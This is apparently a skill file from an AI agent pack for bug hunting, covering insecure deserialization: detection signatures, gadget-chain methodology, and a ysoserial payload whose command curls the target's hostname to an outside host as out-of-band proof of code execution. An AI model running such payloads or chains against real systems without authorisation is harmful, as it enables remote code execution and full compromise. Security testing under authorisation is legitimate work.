---
skill: deserialization
title: "Insecure Deserialization"
category: "Security · Web Exploitation"
load_when: "Serialized blobs in cookies/params (Java/.NET/PHP/pickle/Ruby/Node); viewstate."
pack: SUPERAGENT V10
bughunt: true
---
# Insecure Deserialization

## Where it pays
Reliable RCE on many stacks.

## Attack-surface signals
rO0AB (Java), O:8: (PHP), ViewState (.NET), pickle, node-serialize _$$ND_FUNC$$_.

## Methodology
1. Find serialized data crossing a boundary.
2. Build a gadget chain (ysoserial / POP / pickle __reduce__).
3. OOB confirm blind exec before weaponizing (benign).

## Payloads
```
java -jar ysoserial.jar CommonsCollections5 'curl http://c/$(hostname)' | base64
```
Benign payloads only on live targets.

## Root causes
Deserializing untrusted data with dangerous gadgets; no allowlist/signature.

## Bypasses
Format-specific gadget selection; encoding.

## Validation gate
Confirm code exec (OOB/benign command) — a blob isn't a finding.

## Impact & chains
**RCE** → full compromise.

**→ next on hit: `../phases/04-chain.md`.**
